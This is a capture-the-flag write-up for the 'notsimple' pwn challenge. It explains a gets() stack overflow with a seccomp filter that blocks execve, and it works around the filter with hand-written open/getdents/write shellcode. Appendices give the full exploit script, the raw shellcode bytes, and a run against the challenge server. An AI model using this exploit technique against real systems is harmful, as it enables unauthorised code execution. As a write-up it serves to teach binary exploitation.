@@ -1,0 +1,214 @@
+"You didn't think it would be that easy... right?
+NOTE: The flag is a filename in the current working directory of the server.
+See the docker for reference."
+
+Category:       pwn (250 points)
+Chall author:   Day?
+Writeup author: malfurious
+
+
+
+Setup
+-----
+We are given a binary and a TCP endpoint to connect to, as well as some of the
+Docker config files as mentioned in the description.  A quick check on those
+confirms the location of the flag as it was described:
+
+    #!/bin/sh
+    service xinetd start
+    cd /pwn
+    touch FILE_6768585 FILE_5786754 FILE_76498904 FILE_6784577 FILE_eb94e79028 \
+        FILE_6758838 redpwn_absorption_plan.txt \
+        FILE_1d4a95be0c340478af4141d1658ddd9a304e0bbdf7402526f3fb6306b26130... \
+        rarctf{f4k3_l0c4l_fl4g}
+    sleep infinity
+
+The above is from docker/setup.sh (and is reformatted for the purposes of this
+doc) showing that a file named 'rarctf{something}' is created in the process's
+directory, so we know where to look for it.  We won't be returning to any of the
+Docker files.
+
+
+
+RE
+--
+The notsimple binary has two functions of interest: main() and install_seccomp().
+
+main() starts by calling install_seccomp() and printing a few strings.  One of
+the things printed is the address of a local stack buffer we get to populate.
+Finally, gets() is called on that buffer and the program ends.
+
+It looks as if we have a stack-smash on our hands.  checksec confirms a stack
+canary is not used, and that stack execution is allowed as well.
+
+install_seccomp() enables some kernel system call protections using the Linux
+seccomp feature via the prctl() interface.  Seccomp is typically used to
+explicitly allow or disallow system calls for a process in Linux (and, if a
+process is allow to do so, these restrictions are inherited by fork() and
+preserved by execve() and similar).  Seccomp uses the Berkeley packet filter
+format for syscall filters, so the library function takes this data via a buffer.
+See below for a outline of the calls made by install_seccomp():
+
+    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
+    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, buff, 0, 0);
+
+    PR_SET_NO_NEW_PRIVS = 1 is a necessary step to enable seccomp, and
+    cannot be undone by the calling process
+
+    PR_SET_SECCOMP/MODE_FILTER takes a buffer containing the following
+    structs.  In our case, len = 14.  A dump of the data pointed to by
+    *filter is also given below.
+
+    struct sock_fprog {
+        unsigned short      len;    /* Number of BPF instructions */
+        struct sock_filter *filter; /* Pointer to array of BPF instructions */
+    };
+
+    struct sock_filter {    /* Filter block */
+        __u16   code;       /* Actual filter code */
+        __u8    jt;         /* Jump true */
+        __u8    jf;         /* Jump false */
+        __u32   k;          /* Generic multiuse field */
+    };
+                                      k       jfjtcode        k       jfjtcode
+    (gdb) x/14xg 0x404080                     ____----                ____----
+    0x404080 <filter.2921>:         0x0000000400000020      0xc000003e0b000015
+    0x404090 <filter.2921+16>:      0x0000000000000020      0x4000000000090035
+    0x4040a0 <filter.2921+32>:      0x0000003b00080015      0x0000014200070015
+    0x4040b0 <filter.2921+48>:      0x0000010100060015      0x0000000300050015
+    0x4040c0 <filter.2921+64>:      0x0000005500040015      0x0000008600030015
+    0x4040d0 <filter.2921+80>:      0x0000003900020015      0x0000003a00010015
+    0x4040e0 <filter.2921+96>:      0x7fff000000000006      0x0000000000000006
+
+This was my first real exposure to this feature of Linux, so I was not very
+knowledgeable on it.  Despite effort, I couldn't find anything useful online to
+explain how to decode the fields of struct sock_filter, other than the fact that
+several macros exist to aid with crafting these structs in the first place (1).
+
+Needless to say, tracing these macros out is difficult.  It seems like some of
+the common 'instructions' for the filter are to: validate host architecture,
+catch syscalls in a switch-statement-like structure, and either die or continue,
+based on the instruction of the syscall.
+
+I never fully decoded what syscalls are tagged in this binary.  My initial
+approach to the pwn (which succeeded) was to avoid the typical execve() call to
+get a shell, and use getdents() (get directory entries) to 'properly' list the
+directory contents.
+
+[and yes, experimentation confirmed execve() is disallowed by the filter.]
+
+
+
+Custom shellcode - getdents
+---------------------------
+SYS_getdents() takes an open file descriptor for a directory and populates a
+buffer with an array of 'struct linux_dirent's.
+
+    long getdents(unsigned int fd, struct linux_dirent *dirp,
+            unsigned int count);
+
+    struct linux_dirent {
+        unsigned long  d_ino;     /* Inode number */
+        unsigned long  d_off;     /* Offset to next linux_dirent */
+        unsigned short d_reclen;  /* Length of this linux_dirent */
+        char           d_name[];  /* Filename (null-terminated) */
+                          /* length is actually (d_reclen - 2 -
+                             offsetof(struct linux_dirent, d_name)) */
+        /*
+        char           pad;       // Zero padding byte
+        char           d_type;    // File type (only since Linux
+                                  // 2.6.4); offset is (d_reclen - 1)
+        */
+    }
+
+For our purposes, we don't need to loop and walk the directory properly.  We can
+just dump the output dirent buffer to stdout and inspect the results for ASCII
+file names.  This will keep the shellcode shorter.  So, the plan for the
+shellcode is going to be this:
+
+    open(".", O_RDONLY | O_DIRECTORY, 0);
+    getdents(fd, buffer, size);
+    write(stdout, buffer, size);
+
+
+
+Solution
+--------
+Appendix A contains my full solution.  It is a script utilizing the sploit
+framework found at 'tools/sploit/'.  Appendix B contains the output from the
+run.  Nevermind the segfault...  We can see among the output:
+
+    rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}
+
+
+
+(1) https://github.com/ahupowerdns/secfilter/blob/master/seccomp-bpf.h
+
+
+
+================================================================================
+= Appendix A: sploit.py                                                        =
+================================================================================
+#!/usr/bin/env python3
+
+import sploitutil as util
+import sploitrunner
+
+frame_len = 0x50
+
+shellcode = (
+        b"\x5F\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05"
+        b"\x48\x89\xC7\x5E\x48\xC7\xC2\x00\x04\x00\x00\xB0\x4E\x0F\x05\x48"
+        b"\xC7\xC7\x01\x00\x00\x00\x66\xB8\x01\x00\x0F\x05"
+        #
+        # 0:  5f                      pop    rdi
+        # 1:  48 31 f6                xor    rsi,rsi
+        # 4:  48 31 d2                xor    rdx,rdx
+        # 7:  48 c7 c0 02 00 00 00    mov    rax,0x2
+        # e:  0f 05                   syscall          # fd = open(".", 0, 0)
+        # 10: 48 89 c7                mov    rdi,rax
+        # 13: 5e                      pop    rsi
+        # 14: 48 c7 c2 00 04 00 00    mov    rdx,0x400
+        # 1b: b0 4e                   mov    al,0x4e
+        # 1d: 0f 05                   syscall          # getdents(fd, buff, 1024)
+        # 1f: 48 c7 c7 01 00 00 00    mov    rdi,0x1
+        # 26: 66 b8 01 00             mov    ax,0x1
+        # 2a: 0f 05                   syscall          # write(stdout, buff, 1024)
+        )
+
+payloads = {
+        'shellcode' : shellcode+b'\x90'*(frame_len-len(shellcode)-8),
+        'canary' : util.itob(0xdeadbeef),
+}
+
+def sploit(stdin, stdout):
+    c = util.Communication(stdin, stdout)
+
+    leak_buff = c.recv().split()[3] # "Oops, I'm leaking! **0x7ffd02167bb0**"
+    buff_addr = int(leak_buff, 16)
+    dents_addr = buff_addr - 1024   # Claim stack space for buffer to getdents
+    c.send(
+            b".\x00\x00\x00\x00\x00\x00\x00" # "." directory to open
+            +payloads['shellcode']
+            +payloads['canary']
+            +util.itob(buff_addr+8)          # ret to shellcode
+            +util.itob(buff_addr)            # pop addr of "."
+            +util.itob(dents_addr)           # pop addr of getdents data buff
+            +b"\n"                           # terminate gets input
+            )
+
+# run sploit
+sploitrunner.runsploit(sploit)
+
+
+
+================================================================================
+= Appendix B: run                                                              =
+================================================================================
+> ./sploit nc 193.57.159.27 46343
+['nc', '193.57.159.27', '46343']
+b"Oops, I'm leaking! 0x7ffd02167bb0\n"
+b'Pwn me \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf\n'
+b'> \x1b\x13\t\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x00.\x00\x00\x00\x00\x04\xc8\t\n'
+b'\x04\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x18\x00..\x00\x00\x00\x04\xb6r\x0e\x08\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00 \x00FILE_6768585\x00\x08\xb8r\x0e\x08\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00 \x00FILE_5786754\x00\x08\xb9r\x0e\x08\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00(\x00FILE_76498904\x00\x00\x00\x00\x00\x00\x00\x00\x08\xbar\x0e\x08\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00 \x00FILE_6784577\x00\x08\xbbr\x0e\x08\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00(\x00FILE_eb94e79028\x00\x00\x00\x00\x00\x00\x08\xbcr\x0e\x08\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00 \x00FILE_6758838\x00\x08\xbdr\x0e\x08\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x000\x00redpwn_absorption_plan.txt\x00\x00\x00\x08\xber\x0e\x08\x00\x00\x00\x00\n'
+b'\x00\x00\x00\x00\x00\x00\x00\xe8\x00FILE_1d4a95be0c340478af4141d1658ddd9a304e0bbdf7402526f3fb6306b261309f8ff1183a907ca57d73fa662f8d52b2dea7986a7a195c2ae962c07d77dd8f684e7f9e5fe3ac575aafeaea1b09436ea3217d143e37584fc1d2a1e085535736fb81329fb093\x00\x08\x00\x00\x00\x00\x00\x00\x08\xbfr\x0e\x08\x00\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00X\x00rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}\x00\x00\x08\x1c\x13\t\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00 \x00notsimple\x00\x00\x00\x00\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x8a\xa2QYq\x7f\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00+\xcdB\x02\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\xc1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LR\x1b\xe1Nu\xbd\x00z\x88Yq\x7f\x00\x00\xa0B\x88Yq\x7f\x00\x00\xa0\x10@\x00\x00\x00\x00\x00I\xa4RYq\x7f\x00\x00\x00z\x88Yq\x7f\x00\x00dzRYq\x7f\x00\x00h\r\x00\x00\x00\x00\x00\x00\xb2\xbfQYq\x7f\x00\x00\xe1\xa2m\x01\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00`\x87\x88Yq\x7f\x00\x00h @\x00\x00\x00\x00\x00\xa0B\x88Yq\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00o\xcbQYq\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x16\x02\xfd\x7f\x00\x00\xa0\x10@\x00\x00\x00\x00\x00\xe0|\x16\x02\xfd\x7f\x00\x00\x84\x12@\x00\x00\x00\x00\x00Segmentation fault\n'
